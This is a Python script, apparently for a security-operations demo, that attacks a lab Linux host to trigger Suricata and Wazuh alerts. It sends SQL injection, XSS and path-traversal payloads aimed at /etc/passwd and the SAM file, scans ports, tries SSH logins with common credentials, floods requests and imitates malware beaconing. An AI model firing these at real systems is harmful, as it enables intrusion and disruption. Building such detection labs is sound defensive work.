#!/usr/bin/env python3
"""
windows-attacker.py
===================
Proof-of-Concept Attack Script for SOC Demo
Attacker: Windows Machine
Victim: Alma Linux with SOC Stack

This script demonstrates various attack scenarios that trigger alerts in:
- Suricata IDS (Network-based detection)
- Wazuh SIEM (Host-based detection)

Usage:
    python windows-attacker.py <VICTIM_IP> [OPTIONS]

Examples:
    # Full demo with all scenarios
    python windows-attacker.py 192.168.1.100 --all
    
    # Quick demo (3 scenarios)
    python windows-attacker.py 192.168.1.100 --quick
    
    # Specific attack only
    python windows-attacker.py 192.168.1.100 --scenario web-attacks
    
    # Continuous mode for live demo
    python windows-attacker.py 192.168.1.100 --all --continuous --interval 30
"""

import argparse
import socket
import time
import sys
import json
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime
from typing import List, Dict, Tuple

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class AttackLogger:
    """Logger for attack activities with visual feedback"""
    
    def __init__(self, verbose: bool = True):
        self.verbose = verbose
        self.attack_log = []
        
    def info(self, message: str):
        """Info level log"""
        if self.verbose:
            print(f"{Colors.CYAN}[INFO]{Colors.ENDC} {message}")
    
    def success(self, message: str):
        """Success level log"""
        if self.verbose:
            print(f"{Colors.GREEN}[SUCCESS]{Colors.ENDC} {message}")
    
    def warning(self, message: str):
        """Warning level log"""
        if self.verbose:
            print(f"{Colors.YELLOW}[WARNING]{Colors.ENDC} {message}")
    
    def error(self, message: str):
        """Error level log"""
        if self.verbose:
            print(f"{Colors.RED}[ERROR]{Colors.ENDC} {message}")
    
    def banner(self, title: str):
        """Print a banner"""
        width = 70
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*width}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{title.center(width)}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'='*width}{Colors.ENDC}\n")
    
    def section(self, title: str):
        """Print a section header"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] {title}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * (len(title) + 4)}{Colors.ENDC}")
    
    def log_attack(self, attack_type: str, target: str, status: str, details: str = ""):
        """Log attack for summary"""
        self.attack_log.append({
            'timestamp': datetime.now().isoformat(),
            'type': attack_type,
            'target': target,
            'status': status,
            'details': details
        })
    
    def print_summary(self):
        """Print attack summary"""
        self.banner("ATTACK SUMMARY")
        
        total = len(self.attack_log)
        successful = sum(1 for a in self.attack_log if a['status'] == 'SUCCESS')
        failed = sum(1 for a in self.attack_log if a['status'] == 'FAILED')
        
        print(f"Total attacks executed: {total}")
        print(f"Successful: {Colors.GREEN}{successful}{Colors.ENDC}")
        print(f"Failed: {Colors.RED}{failed}{Colors.ENDC}")
        print()
        
        print(f"{Colors.BOLD}Detailed Log:{Colors.ENDC}")
        for attack in self.attack_log:
            status_color = Colors.GREEN if attack['status'] == 'SUCCESS' else Colors.RED
            print(f"  [{attack['timestamp']}] {attack['type']} -> {attack['target']}: "
                  f"{status_color}{attack['status']}{Colors.ENDC}")
            if attack['details']:
                print(f"    Details: {attack['details']}")


class WindowsAttacker:
    """Main attacker class implementing various attack scenarios"""
    
    def __init__(self, target_ip: str, logger: AttackLogger, http_port: int = 80, 
                 ssh_port: int = 22, wazuh_api_port: int = 55000):
        self.target_ip = target_ip
        self.logger = logger
        self.http_port = http_port
        self.ssh_port = ssh_port
        self.wazuh_api_port = wazuh_api_port
        
    # ==================== SURICATA-TRIGGERING ATTACKS ====================
    
    def web_scanner_detection(self):
        """
        ET SCAN - Web scanner detection
        Triggers Suricata alerts for scanning tools
        """
        self.logger.section("Web Scanner Detection Attack")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        
        scanners = [
            ("Nikto Web Scanner", "Nikto/2.1.6"),
            ("Nmap Scripting Engine", "Mozilla/5.0 (compatible; Nmap Scripting Engine)"),
            ("SQLMap Scanner", "sqlmap/1.0-dev"),
            ("OpenVAS Scanner", "Mozilla/5.0 (OpenVAS)"),
        ]
        
        for scanner_name, user_agent in scanners:
            try:
                headers = {'User-Agent': user_agent}
                req = urllib.request.Request(
                    f"http://{self.target_ip}:{self.http_port}/",
                    headers=headers,
                    method='GET'
                )
                
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.logger.success(f"{scanner_name}: HTTP {response.status}")
                    self.logger.log_attack(
                        'Web Scanner Detection',
                        f"{self.target_ip}:{self.http_port}",
                        'SUCCESS',
                        f"Scanner: {scanner_name}"
                    )
                    
            except urllib.error.HTTPError as e:
                self.logger.warning(f"{scanner_name}: HTTP {e.code} (Expected)")
                self.logger.log_attack(
                    'Web Scanner Detection',
                    f"{self.target_ip}:{self.http_port}",
                    'SUCCESS',
                    f"Scanner: {scanner_name}, Status: {e.code}"
                )
            except Exception as e:
                self.logger.error(f"{scanner_name}: {str(e)}")
                self.logger.log_attack(
                    'Web Scanner Detection',
                    f"{self.target_ip}:{self.http_port}",
                    'FAILED',
                    str(e)
                )
            
            time.sleep(0.5)
    
    def sql_injection_attack(self):
        """
        ET WEB_SERVER - SQL Injection detection
        Triggers Suricata SQL injection alerts
        """
        self.logger.section("SQL Injection Attack")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        
        sqli_payloads = [
            ("Classic SQLi", "/search?q=1' OR '1'='1"),
            ("UNION SQLi", "/search?q=1' UNION SELECT 1,2,3--"),
            ("Time-based SQLi", "/search?q=1' AND SLEEP(5)--"),
            ("Error-based SQLi", "/search?q=1' AND 1=CONVERT(int,@@version)--"),
            ("Blind SQLi", "/search?q=1' AND SUBSTRING(@@version,1,1)='5"),
        ]
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        for attack_name, payload in sqli_payloads:
            try:
                encoded_payload = urllib.parse.quote(payload, safe='/=?')
                url = f"http://{self.target_ip}:{self.http_port}{encoded_payload}"
                
                req = urllib.request.Request(url, headers=headers, method='GET')
                
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.logger.success(f"{attack_name}: HTTP {response.status}")
                    self.logger.log_attack(
                        'SQL Injection',
                        url,
                        'SUCCESS',
                        f"Payload: {payload[:50]}..."
                    )
                    
            except urllib.error.HTTPError as e:
                self.logger.warning(f"{attack_name}: HTTP {e.code} (WAF/IDS blocked)")
                self.logger.log_attack(
                    'SQL Injection',
                    url,
                    'SUCCESS',
                    f"Blocked with HTTP {e.code}"
                )
            except Exception as e:
                self.logger.error(f"{attack_name}: {str(e)[:50]}")
                self.logger.log_attack(
                    'SQL Injection',
                    url,
                    'FAILED',
                    str(e)[:100]
                )
            
            time.sleep(0.3)
    
    def xss_attack(self):
        """
        ET WEB_SERVER - Cross-Site Scripting detection
        Triggers Suricata XSS alerts
        """
        self.logger.section("Cross-Site Scripting (XSS) Attack")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        
        xss_payloads = [
            ("Basic XSS", "/comment?text=<script>alert('XSS')</script>"),
            ("Image XSS", "/upload?file=<img src=x onerror=alert('XSS')>"),
            ("Event XSS", "/search?q=<body onload=alert('XSS')>"),
            ("Encoded XSS", "/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"),
        ]
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        for attack_name, payload in xss_payloads:
            try:
                url = f"http://{self.target_ip}:{self.http_port}{payload}"
                req = urllib.request.Request(url, headers=headers, method='GET')
                
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.logger.success(f"{attack_name}: HTTP {response.status}")
                    self.logger.log_attack(
                        'XSS Attack',
                        url,
                        'SUCCESS',
                        f"Payload: {payload[:60]}..."
                    )
                    
            except urllib.error.HTTPError as e:
                self.logger.warning(f"{attack_name}: HTTP {e.code} (WAF/IDS blocked)")
                self.logger.log_attack(
                    'XSS Attack',
                    url,
                    'SUCCESS',
                    f"Blocked with HTTP {e.code}"
                )
            except Exception as e:
                self.logger.error(f"{attack_name}: {str(e)[:50]}")
                self.logger.log_attack(
                    'XSS Attack',
                    url,
                    'FAILED',
                    str(e)[:100]
                )
            
            time.sleep(0.3)
    
    def path_traversal_attack(self):
        """
        ET WEB_SERVER - Path Traversal detection
        Triggers Suricata path traversal alerts
        """
        self.logger.section("Path Traversal Attack")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        
        traversal_payloads = [
            ("Basic Traversal", "/download?file=../../../etc/passwd"),
            ("Double Encoding", "/download?file=..%2f..%2f..%2fetc%2fpasswd"),
            ("Null Byte", "/download?file=../../../etc/passwd%00"),
            ("Unicode", "/download?file=..%c0%af..%c0%af..%c0%afetc/passwd"),
            ("Windows Style", "/download?file=..\\..\\..\\windows\\system32\\config\\sam"),
        ]
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        for attack_name, payload in traversal_payloads:
            try:
                url = f"http://{self.target_ip}:{self.http_port}{payload}"
                req = urllib.request.Request(url, headers=headers, method='GET')
                
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.logger.success(f"{attack_name}: HTTP {response.status}")
                    self.logger.log_attack(
                        'Path Traversal',
                        url,
                        'SUCCESS',
                        f"Payload: {payload[:60]}..."
                    )
                    
            except urllib.error.HTTPError as e:
                self.logger.warning(f"{attack_name}: HTTP {e.code} (WAF/IDS blocked)")
                self.logger.log_attack(
                    'Path Traversal',
                    url,
                    'SUCCESS',
                    f"Blocked with HTTP {e.code}"
                )
            except Exception as e:
                self.logger.error(f"{attack_name}: {str(e)[:50]}")
                self.logger.log_attack(
                    'Path Traversal',
                    url,
                    'FAILED',
                    str(e)[:100]
                )
            
            time.sleep(0.3)
    
    def malicious_user_agents(self):
        """
        ET POLICY - Suspicious User-Agent detection
        Triggers alerts for known malicious tools
        """
        self.logger.section("Malicious User-Agent Detection")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        
        malicious_agents = [
            ("Wget/Curl Tool", "Wget/1.21.1"),
            ("Python Requests", "python-requests/2.28.0"),
            ("Go HTTP Client", "Go-http-client/1.1"),
            ("Java HTTP Client", "Java/11.0.2"),
            ("Metasploit", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"),
        ]
        
        for agent_name, user_agent in malicious_agents:
            try:
                headers = {'User-Agent': user_agent}
                req = urllib.request.Request(
                    f"http://{self.target_ip}:{self.http_port}/",
                    headers=headers,
                    method='GET'
                )
                
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.logger.success(f"{agent_name}: HTTP {response.status}")
                    self.logger.log_attack(
                        'Malicious User-Agent',
                        f"{self.target_ip}:{self.http_port}",
                        'SUCCESS',
                        f"Agent: {user_agent[:40]}..."
                    )
                    
            except urllib.error.HTTPError as e:
                self.logger.warning(f"{agent_name}: HTTP {e.code}")
                self.logger.log_attack(
                    'Malicious User-Agent',
                    f"{self.target_ip}:{self.http_port}",
                    'SUCCESS',
                    f"Agent: {user_agent[:40]}..."
                )
            except Exception as e:
                self.logger.error(f"{agent_name}: {str(e)[:50]}")
                self.logger.log_attack(
                    'Malicious User-Agent',
                    f"{self.target_ip}:{self.http_port}",
                    'FAILED',
                    str(e)[:100]
                )
            
            time.sleep(0.3)
    
    def malware_c2_simulation(self):
        """
        ET MALWARE - Malware Command & Control simulation
        Simulates known C2 patterns
        """
        self.logger.section("Malware C2 Simulation")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        
        # Simulate beaconing behavior
        beacon_urls = [
            "/checkin?id=win32_desktop_1921681100",
            "/update?ver=1.2.3",
            "/command?get=new_tasks",
            "/upload?data=base64_encoded_data_here",
        ]
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)',
            'X-Implant-ID': 'implant_12345',
            'X-Session': 'session_abcdef'
        }
        
        self.logger.info("Simulating malware beaconing behavior...")
        
        for i, endpoint in enumerate(beacon_urls):
            try:
                url = f"http://{self.target_ip}:{self.http_port}{endpoint}"
                req = urllib.request.Request(url, headers=headers, method='POST')
                
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.logger.success(f"Beacon {i+1}: HTTP {response.status}")
                    self.logger.log_attack(
                        'Malware C2 Beacon',
                        url,
                        'SUCCESS',
                        f"Beacon {i+1}/4"
                    )
                    
            except urllib.error.HTTPError as e:
                self.logger.warning(f"Beacon {i+1}: HTTP {e.code}")
                self.logger.log_attack(
                    'Malware C2 Beacon',
                    url,
                    'SUCCESS',
                    f"Beacon {i+1}/4"
                )
            except Exception as e:
                self.logger.error(f"Beacon {i+1}: {str(e)[:50]}")
                self.logger.log_attack(
                    'Malware C2 Beacon',
                    url,
                    'FAILED',
                    str(e)[:100]
                )
            
            time.sleep(0.5)
    
    # ==================== WAZUH-TRIGGERING ATTACKS ====================
    
    def ssh_brute_force(self, attempts: int = 10):
        """
        SSH Brute Force Attack
        Triggers Wazuh alerts for failed authentication
        """
        self.logger.section("SSH Brute Force Attack")
        self.logger.info(f"Target: {self.target_ip}:{self.ssh_port}")
        self.logger.info(f"Attempts: {attempts}")
        
        common_usernames = ['root', 'admin', 'user', 'test', 'oracle', 'postgres']
        common_passwords = ['password', '123456', 'admin', 'root', 'toor', '12345678']
        
        self.logger.info("Starting brute force attempts...")
        
        for i, username in enumerate(common_usernames[:attempts]):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.ssh_port))
                
                # Receive SSH banner
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                self.logger.info(f"[{i+1}/{attempts}] Connected - Banner: {banner.strip()}")
                
                # Send fake auth attempt (doesn't actually authenticate)
                auth_attempt = f"{username}\x00{common_passwords[i % len(common_passwords)]}\r\n"
                sock.sendall(auth_attempt.encode())
                
                time.sleep(0.5)
                sock.close()
                
                self.logger.warning(f"[{i+1}/{attempts}] Auth attempt sent for user: {username}")
                self.logger.log_attack(
                    'SSH Brute Force',
                    f"{self.target_ip}:{self.ssh_port}",
                    'SUCCESS',
                    f"Attempt {i+1}/{attempts}, User: {username}"
                )
                
            except socket.timeout:
                self.logger.error(f"[{i+1}/{attempts}] Connection timeout")
                self.logger.log_attack(
                    'SSH Brute Force',
                    f"{self.target_ip}:{self.ssh_port}",
                    'SUCCESS',
                    f"Attempt {i+1}/{attempts}, Status: Timeout"
                )
            except Exception as e:
                self.logger.error(f"[{i+1}/{attempts}] Error: {str(e)[:50]}")
                self.logger.log_attack(
                    'SSH Brute Force',
                    f"{self.target_ip}:{self.ssh_port}",
                    'SUCCESS',
                    f"Attempt {i+1}/{attempts}, Error: {str(e)[:50]}"
                )
            
            time.sleep(0.5)
    
    def port_scan(self):
        """
        Port Scanning
        Triggers both Suricata (network) and Wazuh (host) alerts
        """
        self.logger.section("Port Scanning")
        self.logger.info(f"Target: {self.target_ip}")
        
        # Common ports to scan
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
        
        self.logger.info(f"Scanning {len(ports)} ports...")
        
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target_ip, port))
                
                if result == 0:
                    open_ports.append(port)
                    self.logger.success(f"Port {port}: OPEN")
                else:
                    self.logger.info(f"Port {port}: Closed")
                
                sock.close()
                
            except Exception as e:
                self.logger.error(f"Port {port}: Error - {str(e)[:30]}")
        
        self.logger.log_attack(
            'Port Scan',
            self.target_ip,
            'SUCCESS',
            f"Scanned {len(ports)} ports, Found {len(open_ports)} open: {open_ports}"
        )
    
    def dos_simulation(self, duration: int = 5):
        """
        DoS Simulation - High volume requests
        Triggers Suricata volumetric alerts
        """
        self.logger.section("DoS Simulation (Volume-based)")
        self.logger.info(f"Target: http://{self.target_ip}:{self.http_port}")
        self.logger.info(f"Duration: {duration} seconds")
        
        start_time = time.time()
        request_count = 0
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        self.logger.info("Flooding target with requests...")
        
        while time.time() - start_time < duration:
            try:
                req = urllib.request.Request(
                    f"http://{self.target_ip}:{self.http_port}/",
                    headers=headers,
                    method='GET'
                )
                urllib.request.urlopen(req, timeout=2)
                request_count += 1
                
                if request_count % 50 == 0:
                    self.logger.info(f"Sent {request_count} requests...")
                    
            except:
                request_count += 1
                continue
        
        self.logger.success(f"DoS simulation complete: {request_count} requests in {duration}s")
        self.logger.log_attack(
            'DoS Simulation',
            f"{self.target_ip}:{self.http_port}",
            'SUCCESS',
            f"Sent {request_count} requests in {duration} seconds"
        )
    
    # ==================== SCENARIO RUNNERS ====================
    
    def run_web_attacks(self):
        """Run all web-based attacks"""
        self.web_scanner_detection()
        time.sleep(1)
        self.sql_injection_attack()
        time.sleep(1)
        self.xss_attack()
        time.sleep(1)
        self.path_traversal_attack()
        time.sleep(1)
        self.malicious_user_agents()
    
    def run_network_attacks(self):
        """Run all network-based attacks"""
        self.port_scan()
        time.sleep(1)
        self.ssh_brute_force(attempts=5)
        time.sleep(1)
        self.dos_simulation(duration=3)
    
    def run_all_scenarios(self):
        """Run all attack scenarios"""
        self.run_web_attacks()
        time.sleep(2)
        self.run_network_attacks()
        time.sleep(2)
        self.malware_c2_simulation()


def main():
    parser = argparse.ArgumentParser(
        description='Windows Attacker - SOC Demo Proof of Concept',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    
    parser.add_argument('target_ip', help='IP address of the Alma Linux victim')
    parser.add_argument('--http-port', type=int, default=80, help='HTTP port (default: 80)')
    parser.add_argument('--ssh-port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('--wazuh-port', type=int, default=55000, help='Wazuh API port (default: 55000)')
    parser.add_argument('--all', action='store_true', help='Run all attack scenarios')
    parser.add_argument('--quick', action='store_true', help='Quick demo (subset of attacks)')
    parser.add_argument('--scenario', choices=['web', 'network', 'malware', 'brute-force', 'dos'],
                        help='Run specific scenario')
    parser.add_argument('--continuous', action='store_true', 
                        help='Run in continuous mode (loop)')
    parser.add_argument('--interval', type=int, default=60,
                        help='Interval between attack cycles in continuous mode (default: 60s)')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--quiet', action='store_true', help='Minimal output')
    
    args = parser.parse_args()
    
    # Set verbosity
    verbose = True if args.verbose else False if args.quiet else True
    logger = AttackLogger(verbose=verbose)
    
    # Initialize attacker
    attacker = WindowsAttacker(
        target_ip=args.target_ip,
        logger=logger,
        http_port=args.http_port,
        ssh_port=args.ssh_port,
        wazuh_api_port=args.wazuh_port
    )
    
    # Print banner
    logger.banner("SOC DEMO - WINDOWS ATTACKER")
    logger.info(f"Target: {args.target_ip}")
    logger.info(f"HTTP Port: {args.http_port}")
    logger.info(f"SSH Port: {args.ssh_port}")
    logger.info(f"Continuous Mode: {args.continuous}")
    if args.continuous:
        logger.info(f"Interval: {args.interval} seconds")
    print()
    
    # Main execution loop
    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            if args.continuous:
                logger.banner(f"ATTACK CYCLE #{cycle_count}")
            
            # Run requested scenarios
            if args.all:
                attacker.run_all_scenarios()
            elif args.quick:
                logger.banner("QUICK DEMO MODE")
                attacker.web_scanner_detection()
                time.sleep(1)
                attacker.sql_injection_attack()
                time.sleep(1)
                attacker.ssh_brute_force(attempts=5)
            elif args.scenario == 'web':
                attacker.run_web_attacks()
            elif args.scenario == 'network':
                attacker.run_network_attacks()
            elif args.scenario == 'malware':
                attacker.malware_c2_simulation()
            elif args.scenario == 'brute-force':
                attacker.ssh_brute_force(attempts=10)
            elif args.scenario == 'dos':
                attacker.dos_simulation(duration=5)
            else:
                # Default: run all
                logger.info("No specific scenario selected. Running all attacks...")
                attacker.run_all_scenarios()
            
            # Print summary
            logger.print_summary()
            
            # Break if not continuous
            if not args.continuous:
                break
            
            # Wait for next cycle
            logger.info(f"\nWaiting {args.interval} seconds before next cycle...")
            logger.info("Press Ctrl+C to stop\n")
            time.sleep(args.interval)
            
    except KeyboardInterrupt:
        logger.warning("\n\nAttack interrupted by user")
        logger.print_summary()
        sys.exit(0)
    
    logger.banner("DEMO COMPLETE")
    logger.info("Check the following dashboards for detected attacks:")
    logger.info(f"  - Kibana (Suricata): http://{args.target_ip}:5601")
    logger.info(f"  - Wazuh Dashboard: https://{args.target_ip}")
    logger.info("\nLook for alerts in these index patterns:")
    logger.info("  - suricata-ids-* (Network attacks)")
    logger.info("  - wazuh-alerts-* (Host-based attacks)")


if __name__ == '__main__':
    main()
